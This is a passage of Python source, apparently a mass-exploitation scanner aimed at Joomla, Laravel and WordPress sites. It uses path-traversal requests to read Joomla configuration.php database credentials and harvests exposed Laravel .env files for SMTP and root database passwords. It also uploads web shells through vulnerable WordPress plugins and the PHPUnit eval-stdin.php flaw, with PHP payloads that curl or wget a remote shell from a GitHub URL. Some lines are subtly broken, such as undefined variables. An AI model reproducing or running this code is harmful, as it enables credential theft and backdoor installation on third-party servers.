					o.write('Host: ' + ho + '\n')
					o.write('User: ' + us + '\n')
					o.write('Password: ' + pa + '\n')
					o.write('DB: ' + db + '\n')
			else:
				print('[Joomla] {}{}{} ||{}Jat3_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[Joomla] {}{}{} ||{}Jat3_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Comunity_Config(self, url):
		try:
			e = (url+'/index.php?option=com_community&view=groups&groupid=33&task=app&app=groupfilesharing&do=download&file=../../../../configuration.php&Itemid=0')
			r = requests.get(e, headers=headers, verify=False)
			rr = r.text
			if ('JConfig' and '$user' and '$password' and '$host') in rr:
				print('[Joomla] {}{}{} ||{}Comunity_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				h = "\$host = '(.*?)'"
				u = "\$user = '(.*?)'"
				p = "\$password = '(.*?)'"
				d = "\$db = '(.*?)'"
				ho = re.findall(h, rr)[0]
				us = re.findall(u, rr)[0]
				pa = re.findall(p, rr)[0]
				db = re.findall(db, rr)[0]
				with open('Result/Joomla.txt', 'a') as o:
					o.write(e+'\n')
					o.write('Host: ' + ho + '\n')
					o.write('User: ' + us + '\n')
					o.write('Password: ' + pa + '\n')
					o.write('DB: ' + db + '\n')
			else:
				print('[Joomla] {}{}{} ||{}Comunity_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[Joomla] {}{}{} ||{}Comunity_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Download_Monitor_Config(self, url):
		try:
			e = (url+'/index.php?option=com_download-monitor&file=configuration.php')
			r = requests.get(e, headers=headers, verify=False)
			rr = r.text
			if ('JConfig' and '$user' and '$password' and '$host') in rr:
				print('[Joomla] {}{}{} ||{}Download_Monitor_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				h = "\$host = '(.*?)'"
				u = "\$user = '(.*?)'"
				p = "\$password = '(.*?)'"
				d = "\$db = '(.*?)'"
				ho = re.findall(h, rr)[0]
				us = re.findall(u, rr)[0]
				pa = re.findall(p, rr)[0]
				db = re.findall(db, rr)[0]
				with open('Result/Joomla.txt', 'a') as o:
					o.write(e+'\n')
					o.write('Host: ' + ho + '\n')
					o.write('User: ' + us + '\n')
					o.write('Password: ' + pa + '\n')
					o.write('DB: ' + db + '\n')
			else:
				print('[Joomla] {}{}{} ||{}Download_Monitor_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[Joomla] {}{}{} ||{}Download_Monitor_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def JW_Config(self, url):
		try:
			e = (url+'/plugins/content/jw_allvideos/includes/download.php?file=../../../../configuration.php')
			r = requests.get(e, headers=headers, verify=False)
			rr = r.text
			if ('JConfig' and '$user' and '$password' and '$host') in rr:
				print('[Joomla] {}{}{} ||{}JW_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				h = "\$host = '(.*?)'"
				u = "\$user = '(.*?)'"
				p = "\$password = '(.*?)'"
				d = "\$db = '(.*?)'"
				ho = re.findall(h, rr)[0]
				us = re.findall(u, rr)[0]
				pa = re.findall(p, rr)[0]
				db = re.findall(db, rr)[0]
				with open('Result/Joomla.txt', 'a') as o:
					o.write(e+'\n')
					o.write('Host: ' + ho + '\n')
					o.write('User: ' + us + '\n')
					o.write('Password: ' + pa + '\n')
					o.write('DB: ' + db + '\n')
			else:
				print('[Joomla] {}{}{} ||{}JW_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[Joomla] {}{}{} ||{}JW_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Laravel(self, url):
		try:
			eNv = (url+'/.env')
			headersn = {
				'Connection': 'keep-alive',
				'Cache-Control': 'max-age=0',
				'Upgrade-Insecure-Requests': '1',
				'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
				'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
				'Accept-Encoding': 'gzip, deflate',
				'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
			}
			s = requests.get(eNv, headers=headersn, allow_redirects=True, timeout=3)
			if 'mailtrap.io' in s.text:
				print('[Laravel] {}{}{} ||\033[0;37;41mNot Found SMTP!'.format(sd,sb,url))
			elif s.status_code == 200:
				if 'APP_NAME' in s.text:
					open('Result/ENV.txt', 'a').write(eNv+'\n')
				elif 'MAIL_HOST' in s.text:
					SMTP = re.findall('MAIL_HOST=(.*)', s.text)
					PORT = re.findall('MAIL_PORT=(.*)', s.text)
					USERNAME = re.findall('MAIL_USERNAME=(.*)', s.text)
					PASSWORD = re.findall('MAIL_PASSWORD=(.*)', s.text)
					MENCRYPTION = re.findall('MAIL_ENCRYPTION=(.*)', s.text)
					if 'smtp.mailtrap.io' in SMTP:
						print('[Laravel] {}{}{} ||\033[0;37;41mNot Found SMTP!'.format(sd,sb,url))
					elif 'localhost' in SMTP:
						print('[Laravel] {}{}{} ||\033[0;37;41mNot Found SMTP!'.format(sd,sb,url))
					elif 'null' in SMTP:
						print('[Laravel] {}{}{} ||\033[0;37;41mNot Found SMTP!'.format(sd,sb,url))
					else:
						print('[Laravel] {}{}{} \033[0;37;42mFound SMTP!'.format(sd,sb,url))
						open('Result/SMTP.txt', 'a').write('VICTIM URL : '+ eNv + '\nSMTP HOST : '+ SMTP[0] + '\nSMTP PORT : '+ PORT[0] + '\nSMTP PASSWORD : '+ PASSWORD[0] + '\nSMTP ENCRYPTION : '+ MENCRYPTION[0] + '\n\n')
				elif 'SMTP_HOST' in s.text:
					SMTP = re.findall('SMTP_HOST=(.*)', s.text)
					PORT = re.findall('SMTP_PORT=(.*)', s.text)
					USERNAME = re.findall('SMTP_USERNAME=(.*)', s.text)
					PASSWORD = re.findall('SMTP_PASSWORD=(.*)', s.text)
					MENCRYPTION = re.findall('SMTP_ENCRYPTION=(.*)', s.text)
					if 'smtp.mailtrap.io' in SMTP:
						print('[Laravel] {}{}{} ||\033[0;37;41mNot Found SMTP!'.format(sd,sb,url))
					elif 'localhost' in SMTP:
						print('[Laravel] {}{}{} ||\033[0;37;41mNot Found SMTP!'.format(sd,sb,url))
					elif 'null' in SMTP:
						print('[Laravel] {}{}{} ||\033[0;37;41mNot Found SMTP!'.format(sd,sb,url))
					else:
						print('[Laravel] {}{}{} \033[0;37;42mFound SMTP!'.format(sd,sb,url))
						open('Result/SMTP.txt', 'a').write('VICTIM URL : '+ eNv + '\nSMTP HOST : '+ SMTP[0] + '\nSMTP PORT : '+ PORT[0] + '\nSMTP PASSWORD : '+ PASSWORD[0] + '\nSMTP ENCRYPTION : '+ MENCRYPTION[0] + '\n\n')
				elif 'mailtrap.io' in s.text:
					print('[Laravel] {}{}{} ||\033[0;37;41mNot Found SMTP!'.format(sd,sb,url))
				elif 'DB_USERNAME=root' in s.text:
					ROOTU = re.findall('DB_USERNAME=(.*)', rsmTP.text)
					ROOTP = re.findall('DB_PASSWORD=(.*)', rsmTP.text)
					print('[Laravel] {}{}{} \033[0;37;42mFound VPS/DATABASE!'.format(sd,sb,url))
					open("Result/VPS.txt", 'a').write('HOSTS : ' + url + '\nUSERNAME : ' + ROOTU[0] + '\nPASSWORD : ' + ROOTP[0] + '\n\n')
			elif s.status_code == 302:
				if "APP_NAME" in s.text:
					open('Result/ENV.txt', 'a').write(eNv+'\n')
				elif "MAIL_HOST" in s.text:
					SMTP = re.findall('MAIL_HOST=(.*)', s.text)
					PORT = re.findall('MAIL_PORT=(.*)', s.text)
					USERNAME = re.findall('MAIL_USERNAME=(.*)', s.text)
					PASSWORD = re.findall('MAIL_PASSWORD=(.*)', s.text)
					MENCRYPTION = re.findall('MAIL_ENCRYPTION=(.*)', s.text)
					if 'smtp.mailtrap.io' in SMTP:
						print('[Laravel] {}{}{} ||\033[0;37;41mNot Found SMTP!'.format(sd,sb,url))
					elif 'localhost' in SMTP:
						print('[Laravel] {}{}{} ||\033[0;37;41mNot Found SMTP!'.format(sd,sb,url))
					elif 'null' in SMTP:
						print('[Laravel] {}{}{} ||\033[0;37;41mNot Found SMTP!'.format(sd,sb,url))
					else:
						print('[Laravel] {}{}{} \033[0;37;42mFound SMTP!'.format(sd,sb,url))
						open('Result/SMTP.txt', 'a').write('VICTIM URL : '+ eNv + '\nSMTP HOST : '+ SMTP[0] + '\nSMTP PORT : '+ PORT[0] + '\nSMTP PASSWORD : '+ PASSWORD[0] + '\nSMTP ENCRYPTION : '+ MENCRYPTION[0] + '\n\n')
				elif "SMTP_HOST" in s.text:
					SMTP = re.findall('SMTP_HOST=(.*)', s.text)
					PORT = re.findall('SMTP_PORT=(.*)', s.text)
					USERNAME = re.findall('SMTP_USERNAME=(.*)', s.text)
					PASSWORD = re.findall('SMTP_PASSWORD=(.*)', s.text)
					MENCRYPTION = re.findall('SMTP_ENCRYPTION=(.*)', s.text)
					if 'smtp.mailtrap.io' in SMTP:
						print('[Laravel] {}{}{} ||\033[0;37;41mNot Found SMTP!'.format(sd,sb,url))
					elif 'localhost' in SMTP:
						print('[Laravel] {}{}{} ||\033[0;37;41mNot Found SMTP!'.format(sd,sb,url))
					elif 'null' in SMTP:
						print('[Laravel] {}{}{} ||\033[0;37;41mNot Found SMTP!'.format(sd,sb,url))
					else:
						print('[Laravel] {}{}{} \033[0;37;42mFound SMTP!'.format(sd,sb,url))
						open('Result/SMTP.txt', 'a').write('VICTIM URL : '+ eNv + '\nSMTP HOST : '+ SMTP[0] + '\nSMTP PORT : '+ PORT[0] + '\nSMTP PASSWORD : '+ PASSWORD[0] + '\nSMTP ENCRYPTION : '+ MENCRYPTION[0] + '\n\n')
				elif "DB_USERNAME=root" in s.text:
					ROOTU = re.findall('DB_USERNAME=(.*)', rsmTP.text)
					ROOTP = re.findall('DB_PASSWORD=(.*)', rsmTP.text)
					print('[Laravel] {}{}{} \033[0;37;42mFound VPS/DATABASE!'.format(sd,sb,url))
					open("Result/VPS.txt", 'a').write('HOSTS : ' + url + '\nUSERNAME : ' + ROOTU[0] + '\nPASSWORD : ' + ROOTP[0] + '\n\n')
			else:
				pass
		except:
			pass








class WordPress:
	def buddywp(self, url):

		try:

			data = {'formData': (phpjpg, shell, 'text/html')}
			p = (url+'/wp-content/plugins/buddypress-media/app/helper/rtUploadAttachment.php')
			c = (url+'/wp-content/uploads/rtMedia/tmp/Uploader_By_Cloud7_Agath.php.jpg')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[WordPress] {}{}{} ||{}Buddypress-Media{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Buddypress-Media{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def buddywp2(self, url):

		try:
			data = {'formData':open (phpjpg, 'rb')}
			p = (url+'/wp-content/plugins/buddypress-media/app/helper/rtUploadAttachment.php')
			c = (url+'/wp-content/uploads/rtMedia/tmp/Uploader_By_Cloud7_Agath.php.jpg')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[WordPress] {}{}{} ||{}Buddypress-Media 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Buddypress-Media 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass
	def Woocommerce_PHPUnit(self, url):
		try:
			Check = (url+'/wp-content/plugins/woocommerce-software-license-manager/vendor/phpunit/phpunit/build.xml')
			Exp = (url+'/wp-content/plugins/woocommerce-software-license-manager/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
			Cek = requests.get(Check, headers=headers, timeout=9)
			if 'taskname="phpunit"' in Cek.content:
				shell1 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath.php')
				shell2 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath2.php')
				shell3 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath3.php')
				Payload = '<?php system("curl -O https://raw.githubusercontent.com/NeloF4/RCE/master/One"); system("mv One Uploader_By_Cloud7_Agath.php"); ?>'
				Payload2 = '<?php system("wget https://raw.githubusercontent.com/NeloF4/RCE/master/One -O Uploader_By_Cloud7_Agath2.php"); ?>'
				Payload3 = '<?php fwrite(fopen("Uploader_By_Cloud7_Agath3.php","w+"),file_get_contents("https://raw.githubusercontent.com/NeloF4/RCE/master/One")); ?>'
				r = requests.post(Exp, data=Payload, headers=headers, timeout=10, verify=False)
				rr = requests.post(Exp, data=Payload2, headers=headers, timeout=10, verify=False)
				rrr = requests.post(Exp, data=Payload2, headers=headers, timeout=10, verify=False)
				c1 = requests.get(shell1, headers=headers, timeout=10)
				c2 = requests.get(shell2, headers=headers, timeout=10)
				c3 = requests.get(shell3, headers=headers, timeout=10)
				if 'Uploader_By_Cloud7_Agath_' in c1.content:
					print('[WordPress] {}{}{} ||{}WooCommerce Software{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell1+'\n')
				if 'Uploader_By_Cloud7_Agath_' in c2.content:
					print('[WordPress] {}{}{} ||{}WooCommerce Software{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell2+'\n')
				if 'Uploader_By_Cloud7_Agath_' in c3.content:
					print('[WordPress] {}{}{} ||{}WooCommerce Software{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell3+'\n')
				else:
					print('[WordPress] {}{}{} ||{}WooCommerce Software{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}WooCommerce Software{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass
	def Realia_PHPUnit(self, url):
		try:
			Check = (url+'/wp-content/plugins/realia/libraries/PayPal-PHP-SDK/vendor/phpunit/phpunit/build.xml')
			Exp = (url+'/wp-content/plugins/realia/libraries/PayPal-PHP-SDK/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
			Cek = requests.get(Check, headers=headers, timeout=9)
			if 'taskname="phpunit"' in Cek.content:
				shell1 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath.php')
				shell2 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath2.php')
				shell3 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath3.php')
				Payload = '<?php system("curl -O https://raw.githubusercontent.com/NeloF4/RCE/master/One"); system("mv One Uploader_By_Cloud7_Agath.php"); ?>'
				Payload2 = '<?php system("wget https://raw.githubusercontent.com/NeloF4/RCE/master/One -O Uploader_By_Cloud7_Agath2.php"); ?>'
				Payload3 = '<?php fwrite(fopen("Uploader_By_Cloud7_Agath3.php","w+"),file_get_contents("https://raw.githubusercontent.com/NeloF4/RCE/master/One")); ?>'
				r = requests.post(Exp, data=Payload, headers=headers, timeout=10, verify=False)
				rr = requests.post(Exp, data=Payload2, headers=headers, timeout=10, verify=False)
				rrr = requests.post(Exp, data=Payload2, headers=headers, timeout=10, verify=False)
				c1 = requests.get(shell1, headers=headers, timeout=10)
				c2 = requests.get(shell2, headers=headers, timeout=10)
				c3 = requests.get(shell3, headers=headers, timeout=10)
				if 'Uploader_By_Cloud7_Agath_' in c1.content:
					print('[WordPress] {}{}{} ||{}Realia{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell1+'\n')
				if 'Uploader_By_Cloud7_Agath_' in c2.content:
					print('[WordPress] {}{}{} ||{}Realia{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell2+'\n')
				if 'Uploader_By_Cloud7_Agath_' in c3.content:
					print('[WordPress] {}{}{} ||{}Realia{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell3+'\n')
				else:
					print('[WordPress] {}{}{} ||{}Realia{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Realia{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass
	def Jekyll_PHPUnit(self, url):
		try:
			Check = (url+'/wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/build.xml')
			Exp = (url+'/wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
			Cek = requests.get(Check, headers=headers, timeout=9)
			if 'taskname="phpunit"' in Cek.content:
				shell1 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath.php')
				shell2 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath2.php')
				shell3 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath3.php')
				Payload = '<?php system("curl -O https://raw.githubusercontent.com/NeloF4/RCE/master/One"); system("mv One Uploader_By_Cloud7_Agath.php"); ?>'
				Payload2 = '<?php system("wget https://raw.githubusercontent.com/NeloF4/RCE/master/One -O Uploader_By_Cloud7_Agath2.php"); ?>'
				Payload3 = '<?php fwrite(fopen("Uploader_By_Cloud7_Agath3.php","w+"),file_get_contents("https://raw.githubusercontent.com/NeloF4/RCE/master/One")); ?>'
				r = requests.post(Exp, data=Payload, headers=headers, timeout=10, verify=False)
				rr = requests.post(Exp, data=Payload2, headers=headers, timeout=10, verify=False)
				rrr = requests.post(Exp, data=Payload2, headers=headers, timeout=10, verify=False)
				c1 = requests.get(shell1, headers=headers, timeout=10)
				c2 = requests.get(shell2, headers=headers, timeout=10)
				c3 = requests.get(shell3, headers=headers, timeout=10)
				if 'Uploader_By_Cloud7_Agath_' in c1.content:
					print('[WordPress] {}{}{} ||{}Jekyll{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell1+'\n')
				if 'Uploader_By_Cloud7_Agath_' in c2.content:
					print('[WordPress] {}{}{} ||{}Jekyll{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell2+'\n')
				if 'Uploader_By_Cloud7_Agath_' in c3.content:
					print('[WordPress] {}{}{} ||{}Jekyll{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell3+'\n')
				else:
					print('[WordPress] {}{}{} ||{}Jekyll{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Jekyll{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass
	def Prh_Api_PHPUnit(self, url):
		try:
			Check = (url+'/wp-content/plugins/prh-api/vendor/phpunit/phpunit/build.xml')
			Exp = (url+'/wp-content/plugins/prh-api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
			Cek = requests.get(Check, headers=headers, timeout=9)
			if 'taskname="phpunit"' in Cek.content:
				shell1 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath.php')
				shell2 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath2.php')
				shell3 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath3.php')
				Payload = '<?php system("curl -O https://raw.githubusercontent.com/NeloF4/RCE/master/One"); system("mv One Uploader_By_Cloud7_Agath.php"); ?>'
				Payload2 = '<?php system("wget https://raw.githubusercontent.com/NeloF4/RCE/master/One -O Uploader_By_Cloud7_Agath2.php"); ?>'
				Payload3 = '<?php fwrite(fopen("Uploader_By_Cloud7_Agath3.php","w+"),file_get_contents("https://raw.githubusercontent.com/NeloF4/RCE/master/One")); ?>'
				r = requests.post(Exp, data=Payload, headers=headers, timeout=10, verify=False)
				rr = requests.post(Exp, data=Payload2, headers=headers, timeout=10, verify=False)
				rrr = requests.post(Exp, data=Payload2, headers=headers, timeout=10, verify=False)
				c1 = requests.get(shell1, headers=headers, timeout=10)
				c2 = requests.get(shell2, headers=headers, timeout=10)
				c3 = requests.get(shell3, headers=headers, timeout=10)
				if 'Uploader_By_Cloud7_Agath_' in c1.content:
					print('[WordPress] {}{}{} ||{}Prh-API{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell1+'\n')
				if 'Uploader_By_Cloud7_Agath_' in c2.content:
					print('[WordPress] {}{}{} ||{}Prh-API{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell2+'\n')
				if 'Uploader_By_Cloud7_Agath_' in c3.content:
					print('[WordPress] {}{}{} ||{}Prh-API{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell3+'\n')
				else:
					print('[WordPress] {}{}{} ||{}Prh-API{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Prh-API{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass
	def MM_PHPUnit(self, url):
		try:
			Check = (url+'/wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/build.xml')
			Exp = (url+'/wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
			Cek = requests.get(Check, headers=headers, timeout=9)
			if 'taskname="phpunit"' in Cek.content:
				shell1 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath.php')
				shell2 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath2.php')
				shell3 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath3.php')
				Payload = '<?php system("curl -O https://raw.githubusercontent.com/NeloF4/RCE/master/One"); system("mv One Uploader_By_Cloud7_Agath.php"); ?>'
				Payload2 = '<?php system("wget https://raw.githubusercontent.com/NeloF4/RCE/master/One -O Uploader_By_Cloud7_Agath2.php"); ?>'
				Payload3 = '<?php fwrite(fopen("Uploader_By_Cloud7_Agath3.php","w+"),file_get_contents("https://raw.githubusercontent.com/NeloF4/RCE/master/One")); ?>'
				r = requests.post(Exp, data=Payload, headers=headers, timeout=10, verify=False)
				rr = requests.post(Exp, data=Payload2, headers=headers, timeout=10, verify=False)
				rrr = requests.post(Exp, data=Payload2, headers=headers, timeout=10, verify=False)
				c1 = requests.get(shell1, headers=headers, timeout=10)
				c2 = requests.get(shell2, headers=headers, timeout=10)
				c3 = requests.get(shell3, headers=headers, timeout=10)
				if 'Uploader_By_Cloud7_Agath_' in c1.content:
					print('[WordPress] {}{}{} ||{}MM-Plugin{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell1+'\n')
				if 'Uploader_By_Cloud7_Agath_' in c2.content:
					print('[WordPress] {}{}{} ||{}MM-Plugin{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell2+'\n')
				if 'Uploader_By_Cloud7_Agath_' in c3.content:
					print('[WordPress] {}{}{} ||{}MM-Plugin{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell3+'\n')
				else:
					print('[WordPress] {}{}{} ||{}MM-Plugin{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}MM-Plugin{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass
	def Enfold_Child(self, url):
		try:
			Check = (url+'/wp-content/themes/enfold-child/update_script/vendor/phpunit/phpunit/build.xml')
			Exp = (url+'/wp-content/themes/enfold-child/update_script/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
			Cek = requests.get(Check, headers=headers, timeout=9)
			if 'taskname="phpunit"' in Cek.content:
				shell1 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath.php')
				shell2 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath2.php')
				shell3 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath3.php')
				Payload = '<?php system("curl -O https://raw.githubusercontent.com/NeloF4/RCE/master/One"); system("mv One Uploader_By_Cloud7_Agath.php"); ?>'
				Payload2 = '<?php system("wget https://raw.githubusercontent.com/NeloF4/RCE/master/One -O Uploader_By_Cloud7_Agath2.php"); ?>'
				Payload3 = '<?php fwrite(fopen("Uploader_By_Cloud7_Agath3.php","w+"),file_get_contents("https://raw.githubusercontent.com/NeloF4/RCE/master/One")); ?>'
				r = requests.post(Exp, data=Payload, headers=headers, timeout=10, verify=False)
				rr = requests.post(Exp, data=Payload2, headers=headers, timeout=10, verify=False)
				rrr = requests.post(Exp, data=Payload2, headers=headers, timeout=10, verify=False)
				c1 = requests.get(shell1, headers=headers, timeout=10)
				c2 = requests.get(shell2, headers=headers, timeout=10)
				c3 = requests.get(shell3, headers=headers, timeout=10)
				if 'Uploader_By_Cloud7_Agath_' in c1.content:
					print('[WordPress] {}{}{} ||{}Enfolf-Child{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell1+'\n')
				if 'Uploader_By_Cloud7_Agath_' in c2.content:
					print('[WordPress] {}{}{} ||{}Enfolf-Child{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell2+'\n')
				if 'Uploader_By_Cloud7_Agath_' in c3.content:
					print('[WordPress] {}{}{} ||{}Enfolf-Child{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell3+'\n')
				else:
					print('[WordPress] {}{}{} ||{}Enfolf-Child{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Enfolf-Child{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass
	def DZS_PHPUnit(self, url):
		try:
			Check = (url+'/wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/build.xml')
			Exp = (url+'/wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
			Cek = requests.get(Check, headers=headers, timeout=9)
			if 'taskname="phpunit"' in Cek.content:
				shell1 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath.php')
				shell2 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath2.php')
				shell3 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath3.php')
				Payload = '<?php system("curl -O https://raw.githubusercontent.com/NeloF4/RCE/master/One"); system("mv One Uploader_By_Cloud7_Agath.php"); ?>'
				Payload2 = '<?php system("wget https://raw.githubusercontent.com/NeloF4/RCE/master/One -O Uploader_By_Cloud7_Agath2.php"); ?>'
				Payload3 = '<?php fwrite(fopen("Uploader_By_Cloud7_Agath3.php","w+"),file_get_contents("https://raw.githubusercontent.com/NeloF4/RCE/master/One")); ?>'
				r = requests.post(Exp, data=Payload, headers=headers, timeout=10, verify=False)
				rr = requests.post(Exp, data=Payload2, headers=headers, timeout=10, verify=False)
				rrr = requests.post(Exp, data=Payload2, headers=headers, timeout=10, verify=False)
				c1 = requests.get(shell1, headers=headers, timeout=10)
				c2 = requests.get(shell2, headers=headers, timeout=10)
				c3 = requests.get(shell3, headers=headers, timeout=10)
				if 'Uploader_By_Cloud7_Agath_' in c1.content:
					print('[WordPress] {}{}{} ||{}Dzs-Videogallery{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell1+'\n')
				if 'Uploader_By_Cloud7_Agath_' in c2.content:
					print('[WordPress] {}{}{} ||{}Dzs-Videogallery{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell2+'\n')
				if 'Uploader_By_Cloud7_Agath_' in c3.content:
					print('[WordPress] {}{}{} ||{}Dzs-Videogallery{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell3+'\n')
				else:
					print('[WordPress] {}{}{} ||{}Dzs-Videogallery{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Dzs-Videogallery{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass
	def Contabileads_PHPUnit(self, url):
		try:
			Check = (url+'/wp-content/plugins/contabileads/integracoes/mautic/api-library/vendor/phpunit/phpunit/build.xml')
